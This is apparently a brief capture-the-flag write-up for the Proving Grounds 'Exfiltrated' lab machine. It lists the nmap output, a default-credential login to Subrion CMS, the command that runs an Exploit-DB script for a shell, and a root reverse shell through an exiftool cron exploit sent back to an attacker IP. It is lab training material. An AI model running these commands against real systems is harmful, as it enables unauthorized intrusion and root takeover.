---
tags: [ProvingGround]
---

Exfiltrated 5/16/25

----------------------------

## 1. sudo nmap -Pn -n 192.168.208.163 -oN nmap/initial -sC -sV -p- --open
[sudo] password for kali:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-16 13:52 MDT
Nmap scan report for 192.168.208.163
Host is up (0.081s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 7 disallowed entries
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/
|_/updates/
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
## 2. Went to http://192.168.208.163/panel/ saw that it was Subrion CMS v 4.2.1.
## 3. Google'd defaul creds. Found admin/admin
## 4. Found exploit 49876
## 5. python3 49876.py -u http://192.168.208.163/panel/ -l admin -p admin
Received shell as web
## 6. Viewed cat /etc/crontab
## 7. Saw bash /opt/image-exif.sh running every minute.
## 8. Saw that scipt runs exiftool against *.jpg files in /var/www/html/subrion/uploads
## 9. Looked for exiftool exploits and found 50911 on searchsploit
## 10. python3 50911.py -s 192.168.45.235 443
## 11. Received reverse shell as root.